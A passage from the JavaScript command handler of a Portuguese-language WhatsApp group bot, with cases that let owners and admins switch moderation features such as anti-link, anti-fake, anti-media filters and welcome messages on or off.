if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAnticall) return reply('Ja esta ativo')
anticall.push('Ativado')
fs.writeFileSync('./funções de cmd/usuarios/anticall.json', JSON.stringify(anticall))
reply('Ativou com sucesso o recurso de antiligação no bot✔️')
} else if (Number(args[0]) === 0) {
if (!isAnticall) return reply('Ja esta Desativado')  
fs.writeFileSync('./funções de cmd/usuarios/anticall.json', JSON.stringify([]))
reply('Desativou com sucesso o recurso de antiligação no bot✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
} catch {
reply('Falha ao ativar')
}
break

case 'antipvon':
if (!SoDono && !m.key.fromMe ) return reply('Apenas Meu Dono')
if (banChats) return await reply('já está ativo o modo antipv')
banChats = true
nescessario.banChats = banChats
fs.writeFileSync('./config.js', JSON.stringify(nescessario, null, '\t'))
await aqua.sendMessage(from, {text: "*Sucesso alterado para modo antipv, pv não poderá ser utilizado"})
break

case 'antipvoff':
if (!SoDono && !m.key.fromMe) return await reply('Apenas meu dono o owner')
if (!banChats) return await reply('Nao estava ativado ainda')
banChats = false
nescessario.banChats = banChats
fs.writeFileSync('./config.js', JSON.stringify(nescessario, null, '\t'))
await aqua.sendMessage(from, {text: "*Sucesso modo antipv desligado, pv liberado."})
break

case 'antipv':
if (!SoDono) return reply(`Apenas dono pode ativar/desativar essa função..`)
if (Number(args[0]) === 1) {
if (isAntiPv) return reply('Ja esta ativo')
antipv.push('Ativado')
fs.writeFileSync('./funções de cmd/usuarios/antipv.json', JSON.stringify(antipv))
reply('🌀 Ativou com sucesso o recurso de anti privado 📝')
} else if (Number(args[0]) === 0) {
if (!isAntiPv) return reply('Já está desativado')
fs.writeFileSync('./funções de cmd/usuarios/antipv.json', JSON.stringify([]))
reply('‼️ Desativou com sucesso o recurso De antipv ✔️')
} else {
if(isAntiPv){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1},
]
}
buttonMessage02 = {
text: `
╭━━━━━◉                                       ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
       ║           ㅤ 𝗣𝗩 𝗗𝗢 𝗕𝗢𝗧                ║
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉                                       ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ
ㅤㅤ  ㅤ  

┠➥[👤] 𝗢𝗟𝗔 𝗠𝗘𝗦𝗧𝗥𝗘: ${pushname}
┠➥[👥] 𝗚𝗥𝗨𝗣𝗢: ${groupName}
┠➥[💧] Quem Enviar Mensagens no PV
┠➥[💧] Sera Automaticamente Bloqueado.
╰─╼━━━══━━━━≺🔵≻━━━━══━━━╾─╯`,
footer: `status: ${isAntiPv ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{
forwardingScore:999,
isForwarded:true,
}}
aqua.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'autoreação':
case 'autoreacao':
case 'autoreact':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (Number(args[0]) === 1) {
if (isAutoReact) return reply('Já está ativado')
autoreact.push(from)
fs.writeFileSync('./funções de cmd/funções/autoreact.json', JSON.stringify(autoreact))
reply('[🩸] Ativou com sucesso o recurso de auto reação neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAutoReact) return reply('Já está desativado')
pesquisar = from
processo = autoreact.indexOf(pesquisar)
while(processo >= 0){
autoreact.splice(processo, 1)
processo = autoreact.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/funções/autoreact.json', JSON.stringify(autoreact))
reply('‼️ Desativou com sucesso o recurso de auto reação neste grupo✔️')
} else {
if(isAutoReact){
buttons02 = [{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}]
} else {
buttons02 = [{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1}]
}
buttonMessage02 = {
text: `
╭━━━━━◉                                       ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
       ║        ㅤ𝗔𝗨𝗧𝗢 𝗥𝗘𝗔𝗖𝗧               ║
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉                                       ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ
ㅤㅤ  ㅤ  

┠➥[👤] 𝗢𝗟𝗔 𝗔𝗗𝗠: ${pushname}
┠➥[👥] 𝗚𝗥𝗨𝗣𝗢: ${groupName}
┠➥[💧] Esterei Reagindo a Todas as Mensagens.
┠➥[💧] Em Caso de Atrasos, Desative a Função !
╰─╼━━━══━━━━≺🔵≻━━━━══━━━╾─╯`,
footer: `O auto react está ${isAutoReact ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
aqua.sendMessage(from, buttonMessage02, {quoted: selo})
}
break



//=================(ANTS)=================\\

case 'anticontatos':
case 'antictt':
case 'anticontato':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !isGroupAdmins) return reply(enviar.msg.adm)
buttons22 = [
  {buttonId:`${prefix}ct1`, buttonText: {displayText: 'Ligar'}, type: 1},
  {buttonId: `${prefix}ct0`, buttonText: {displayText: 'Desligar'}, type: 1}]
buttonMessage22 = {
    text: "╭━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╮\n         𝗔𝗡𝗧𝗜 𝗖𝗢𝗡𝗧𝗔𝗧𝗢\n╰━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╯",
    footer: '🩸 𝘼𝙉𝙏𝙄-𝘾𝙊𝙉𝙏𝘼𝙏𝙊\n𝘾??𝙢 𝙀𝙨𝙩𝙚 𝘾𝙤𝙢𝙖𝙣𝙙𝙤 𝘼𝙩𝙞𝙫𝙖𝙙𝙤\n𝙌𝙪𝙚𝙢 𝙀𝙣𝙫𝙞𝙖𝙧 𝘾𝙤𝙣𝙩𝙖𝙩𝙤 𝙉𝙤 𝙂𝙧𝙪𝙥𝙤\n𝙎𝙚𝙧𝙖́ 𝘼𝙪𝙩𝙤𝙢𝙖𝙩𝙞𝙘𝙖𝙢𝙚𝙣𝙩𝙚 𝙍𝙚𝙢𝙤𝙫𝙞𝙙𝙤',
    buttons: buttons22,
    headerType: 1
}
sendMsg = await aqua.sendMessage(from, buttonMessage22, {quoted: selo})
break

case 'ct1':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (isAntiCtt) return reply('Ja esta ativo')
antictt.push(from)
fs.writeFileSync('./funções de cmd/antis/antictt.json', JSON.stringify(antictt))
reply('🌀 Ativou com sucesso o recurso de anticontato neste grupo 📝')
break 

case 'ct0':
if (!isGroup) return reply(enviar.msg.grupo)
if (!SoDono && !isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (!isAntiCtt) return reply('Ja esta Desativado')
pesquisar = from
processo = antictt.indexOf(pesquisar)
while(processo >= 0){
antictt.splice(processo, 1)
processo = antictt.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/antictt.json', JSON.stringify(antictt))
reply('‼️ Desativou com sucesso o recurso de anticontato neste grupo✔️')
break

case 'anticatalogo':
case 'anticatalg':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAnticatalogo) return reply('Ja esta ativo')
anticatalogo.push(from)
fs.writeFileSync('./funções de cmd/antis/anticatalogo.json', JSON.stringify(anticatalogo))
reply('[🩸] Ativou com sucesso o recurso de anticatalogo neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAnticatalogo) return reply('Ja esta Desativado')
pesquisar = from
processo = anticatalogo.indexOf(pesquisar)
while(processo >= 0){
anticatalogo.splice(processo, 1)
processo = anticatalogo.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/anticatalogo.json', JSON.stringify(anticatalogo))
reply('‼️ Desativou com sucesso o recurso de anticatalogo neste grupo✔️')
} else {
if(isAnticatalogo){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1}
]
}
buttonMessage02 = {
text: `╭━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╮
          𝗔𝗡𝗧𝗜 𝗖𝗔𝗧𝗔𝗟𝗢𝗚𝗢
╰━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╯`,
footer: `O anti catálogo está ${isAnticatalogo ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
aqua.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'botoff':
case 'boton':
case 'bot':
if (!isGroup) return reply(enviar.msg.grupo)
if(!SoDono) return reply("Só dono pode executar esta ação...")
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (botoff.includes(from)) return reply('Ja esta ativo')
botoff.push(from)
fs.writeFileSync('./funções de cmd/grupos/botoff.json', JSON.stringify(botoff))
reply('Desativando funções e parando a execução de comandos por membros com sucesso...')
} else if (Number(args[0]) === 0) {
if (!botoff.includes(from)) return reply('Ja esta Desativado')
pesquisar = from
processo = botoff.indexOf(pesquisar)
while(processo >= 0){
botoff.splice(processo, 1)
processo = botoff.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/grupos/botoff.json', JSON.stringify(botoff))
reply(`Ativando todos os funcionamentos do bot novamente...`)
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antifake':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntifake) return reply('Ja esta ativo')
antifake.push(from)
fs.writeFileSync('./funções de cmd/antis/antifake.json', JSON.stringify(antifake))
reply('[🩸] Ativou com sucesso o recurso de antifake neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAntifake) return reply('Ja esta Desativado')
pesquisar = from
processo = antifake.indexOf(pesquisar)
while(processo >= 0){
antifake.splice(processo, 1)
processo = antifake.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/antifake.json', JSON.stringify(antifake))
reply('‼️ Desativou com sucesso o recurso de antifake neste grupo✔️')
} else {
if(isAntifake){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1}
]
}
buttonMessage02 = {
text: `
╭━━━━━◉                                       ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
       ║        ㅤㅤ𝗔𝗡𝗧𝗜  𝗙𝗔𝗞𝗘               ║
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉                                       ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ
ㅤㅤ  ㅤ  

┠➥[👤] 𝗢𝗟𝗔 𝗔𝗗𝗠: ${pushname}
┠➥[👥] 𝗚𝗥𝗨𝗣𝗢: ${groupName}
┠➥[💧] Quem Não For +55
┠➥[💧] Sera Automaticamente Removido.
╰─╼━━━══━━━━≺🔵≻━━━━══━━━╾─╯`,
footer: `O anti fake está ${isAntifake ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
aqua.sendMessage(from, buttonMessage02, {quoted: selo})
}
break

case 'antiloc':
if (!isGroup) return reply(` SOMENTE EM GRUPOS`)
if (!isGroupAdmins) return reply(`PRECISA SER ADMIN`)
if (!isBotGroupAdmins) return reply(` O BOT PRECISA SER ADMIN`)
try {		 
if (args.length < 1) return reply('1 pra ativar, 0 pra desligar')
if (Number(args[0]) === 1) {
if(Antiloc) return reply('Já está Ativo.')
antiloc.push(from)
fs.writeFileSync('./funções de cmd/antis/antiloc.json', JSON.stringify(antiloc))
reply('Ativou com sucesso o recurso de anti loc neste grupo✔️')
} else if (Number(args[0]) === 0) {
if(!Antiloc) return reply('Já está Desativado.')
antiloc.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antiloc.json', JSON.stringify(antiloc))
reply('Desativou com sucesso o recurso de anti loc neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
} catch {
reply('Deu erro, tente novamente :/')
}
break

case 'antidocumento':
case 'antidoc':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (Antidoc) return reply('Ja esta ativo')
antidoc.push(from)
fs.writeFileSync('./funções de cmd/antis/antidoc.json', JSON.stringify(antidoc))
reply('🌀 Ativou com sucesso o recurso de anti documento neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!Antidoc) return reply('Ja esta Desativado')
pesquisar = from
processo = antidoc.indexOf(pesquisar)
while(processo >= 0){
antidoc.splice(processo, 1)
processo = antidoc.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/antidoc.json', JSON.stringify(antidoc))
reply('‼️ Desativou com sucesso o recurso de anti documento neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiimg':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiImg) return reply('Já Esta ativo')
antiimg.push(from)
fs.writeFileSync('./funções de cmd/antis/antiimg.json', JSON.stringify(antiimg))
reply('Ativou com sucesso o recurso de anti imagem neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiImg) return reply('Ja esta Desativado.')
antiimg.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antiimg.json', JSON.stringify(antiimg))
reply('Desativou com sucesso o recurso de anti imagem neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antisticker':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiSticker) return reply('Já Esta ativo')
antisticker.push(from)
fs.writeFileSync('./funções de cmd/antis/antisticker.json', JSON.stringify(antisticker))
reply('Ativou com sucesso o recurso de anti sticker neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiSticker) return reply('Ja esta Desativado.')
antisticker.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antisticker.json', JSON.stringify(antisticker))
reply('Desativou com sucesso o recurso de anti sticker neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antinotas':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiNotas) return reply('Já Esta ativo')
antinotas.push(from)
fs.writeFileSync('./funções de cmd/antis/antinotas.json', JSON.stringify(antinotas))
reply('Ativou com sucesso o recurso de anti notas neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiNotas) return reply('Ja esta Desativado.')
antinotas.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antinotas.json', JSON.stringify(antinotas))
reply('Desativou com sucesso o recurso de anti notas neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antivideo':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiVid) return reply('Ja esta ativo')
antivid.push(from)
fs.writeFileSync('./funções de cmd/antis/antivideo.json', JSON.stringify(antivid))
reply('Ativou com sucesso o recurso de anti video neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiVid) return reply('Ja esta Desativado')
antivid.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antivideo.json', JSON.stringify(antivid))
reply('Desativou com sucesso o recurso de anti video neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiaudio':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isAntiAudio) return reply('Ja esta ativo')
antiaudio.push(from)
fs.writeFileSync('./funções de cmd/antis/antiaudio.json', JSON.stringify(antiaudio))
reply('Ativou com sucesso o recurso de anti audio neste grupo✔️')
} else if (Number(args[0]) === 0) {
if (!isAntiAudio) return reply('Ja esta Desativado')  
antiaudio.splice(from, 1)
fs.writeFileSync('./funções de cmd/antis/antiaudio.json', JSON.stringify(antiaudio))
reply('Desativou com sucesso o recurso de anti audio neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'limitecaracteres':
case 'limiteflood':  
if (!isGroup) return reply(enviar.msg.adm)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply(`Digite ${prefix + command} 1 para ativar`)
if (Number(args[0]) === 1) {
if (isAntiFlood) return reply(`🌀 O recurso limite de caracteres até ${limitefl} já está ativo no grupo 🌀`)
antiflood.push(from)
fs.writeFileSync('./funções de cmd/usuarios/antiflood.json', JSON.stringify(antiflood))
reply(`✔️ O recurso limite de caracteres ${limitefl} foi ativado nesse grupo📝`)
} else if (Number(args[0]) === 0) {
 if (!isAntiFlood) return reply('✔️ O recurso limite de caracteres não está ativado no grupo 📝')
let position = false
Object.keys(antiflood).forEach((i) => {
if (antiflood[i] === from) {
position = i
}
})
if (position !== false) {
antiflood.splice(position, 1)
fs.writeFileSync('./funções de cmd/usuarios/antiflood.json', JSON.stringify(antiflood))
}
reply('O recurso limite de caracteres foi desativado nesse grupo ✔️')
} else {
reply(`Digite ${prefix + command} 1 para ativar, 0 para desativar o recurso`)
}
break

case 'resetarttt':
case 'rvttt':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
daily.splice([])
fs.writeFileSync('./funções de cmd/usuarios/diario.json', JSON.stringify(daily))
reply('‼️O jogo da velha TTT foi resetado com sucesso..✔️')
reply(`${prefix}reiniciar`)
break

case 'antipalavrão':
case 'antipalavrao':  
case 'antipalavra':    
if (!isGroup) return reply(`[❗] SOMENTE EM GRUPOS`)
if (!isGroupAdmins) return reply(`[❗] O PRECISA SER ADMIN`)
if (!isBotGroupAdmins) return reply(`[❗] O BOT PRECISA SER ADMIN`)
if (args.length < 1) return reply(`[❗] 1 / 0, Exemplo ${prefix + command} 1`)
if (Number(args[0]) === 1) {
if (isPalavrao) return reply('Ja esta ativo.')
palavrao.push(from)
fs.writeFileSync('./funções de cmd/grupos/palavrao.json', JSON.stringify(palavrao))
reply('🌀 Ativou com sucesso o recurso de Anti Palavras hardcore neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isPalavrao) return reply('Ja esta Desativado')
pesquisar = from
processo = palavrao.indexOf(pesquisar)
while(processo >= 0){
palavrao.splice(processo, 1)
processo = palavrao.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/grupos/palavrao.json', JSON.stringify(palavrao))
reply('‼️ Desativou com sucesso o recurso de Anti Palavra harcore neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antiporn':
                    try {
                        if (!isGroup) return reply(mess.only.group)
                        if (!isGroupAdmins) return reply(mess.only.admin)
                        if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                        if (args.length < 1) return reply('Hmmmm')
                        if (Number(args[0]) === 1) {
                            if (isAntiPorn) return reply('Ja esta ativo')
                            antiporn.push(from)
                            fs.writeFileSync('./funções de cmd/antis/antiporn.json', JSON.stringify(antiporn))
                            reply('Ativou com sucesso o recurso de antipornô neste grupo✔️')
                        } else if (Number(args[0]) === 0) {
                            antiporn.splice(from, 1)
                            fs.writeFileSync('./funções de cmd/antis/antiporn.json', JSON.stringify(antiporn))
                            reply('Desativou com sucesso o recurso de antipornô neste grupo✔️')
                        } else {
                            reply('1 para ativar, 0 para desativar')
                        }
                    } catch {
                        reply(msgerr)
                    }
                    break

case 'antilinkhard':
case 'antilink':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntiLinkHard) return reply('Ja esta ativo')
antilinkhard.push(from)
fs.writeFileSync('./funções de cmd/antis/antilinkhard.json', JSON.stringify(antilinkhard))
reply('[🩸] Ativou com sucesso o recurso de antilink hardcore neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAntiLinkHard) return reply('Ja esta Desativado')
pesquisar = from
processo = antilinkhard.indexOf(pesquisar)
while(processo >= 0){
antilinkhard.splice(processo, 1)
processo = antilinkhard.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/antilinkhard.json', JSON.stringify(antilinkhard))
reply('‼️ Desativou com sucesso o recurso de antilink harcore neste grupo✔️')
} else {
if(isAntiLinkHard){
buttons02 = [{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}]
} else {
buttons02 = [{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1}]
}
buttonMessage02 = {
text: `╭━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╮\n         𝗔𝗡𝗧𝗜 𝗟𝗜𝗡𝗞\n╰━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╯`,
footer: `O anti link está ${isAntiLinkHard ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
aqua.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'antilinkgp':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isAntilinkgp) return reply('Ja esta ativo')
antilinkgp.push(from)
fs.writeFileSync('./funções de cmd/antis/antilinkgp.json', JSON.stringify(antilinkgp))
reply('[🩸] Ativou com sucesso o recurso de antilinkgp 📝')
} else if (Number(args[0]) === 0) {
if (!isAntilinkgp) return reply('Ja esta Desativado')
pesquisar = from
processo = antilinkgp.indexOf(pesquisar)
while(processo >= 0){
antilinkgp.splice(processo, 1)
processo = antilinkgp.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/antilinkgp.json', JSON.stringify(antilinkgp))
reply('‼️ Desativou com sucesso o recurso de antilink de grupo ✔️')
} else {
if(isAntilinkgp){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1},
]
}
buttonMessage02 = {
text: `╭━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╮\n         𝗔𝗡𝗧𝗜 𝗟𝗜𝗡𝗞 𝗗𝗘 𝗚𝗥𝗨𝗣𝗢\n╰━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╯`,
footer: `O anti link grupo está ${isAntilinkgp ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
aqua.sendMessage(from, buttonMessage02, {quoted:selo})
}
break


case 'welcome':
case 'bemvindo':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isWelkom) return reply('Ja esta ativo')
welkom.push(from)
fs.writeFileSync('./funções de cmd/grupos/welkom.json', JSON.stringify(welkom))
reply('[🩸] Ativou com sucesso o recurso de bem vindo neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isWelkom) return reply('Ja esta Desativado')
pesquisar = from
processo = welkom.indexOf(pesquisar)
while(processo >= 0){
welkom.splice(processo, 1)
processo = welkom.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/grupos/welkom.json', JSON.stringify(welkom))
reply('‼️ Desativou com sucesso o recurso de bemvindo neste grupo✔️')
} else {
if(isWelkom){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1},
]
}
buttonMessage02 = {
text: `╭━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╮
           𝗕𝗘𝗠 𝗩𝗜𝗡𝗗𝗢
╰━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╯`,
footer: `O bem vindo está ${isWelkom ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
return aqua.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'bemvindo2':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (Number(args[0]) === 1) {
reply(`Devo Lembrar que você deve determinar a legenda desse grupo, após ativar essa função, a legenda funciona por grupo, se deseja saber mais informações sobre, digite ${prefix}infobemvindo`)  
if (isWelkom2) return reply('❎O recurso já está ativado no grupo❎')
welkom2.push(from)
fs.writeFileSync('./funções de cmd/usuarios/vacilo.json', JSON.stringify(welkom2))
reply('✅O recurso foi ativado✅')
} else if (Number(args[0]) === 0) {
if (!isWelkom2) return reply('❎O recurso não está ativado no grupo❎')
let position = false
Object.keys(welkom2).forEach((i) => {
if (welkom2[i] === from) {
position = i
}
})
if (position !== false) {
welkom2.splice(position, 1)
fs.writeFileSync('./funções de cmd/usuarios/vacilo.json', JSON.stringify(welkom2))
}
reply('❌O recurso foi desativado❌')
} else {
if(isWelkom2){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1}
]
}
buttonMessage02 = {
text: `╭━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╮
          𝗕𝗘𝗠 𝗩𝗜𝗡𝗗𝗢 𝗦𝗘𝗠 𝗙𝗢𝗧𝗢
╰━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ🩸❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╯`,
footer: `O bemvindo está ${isWelkom2 ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
aqua.sendMessage(from, buttonMessage02, {quoted:selo})
}
break

case 'infobemvindo':
case 'infobv':  
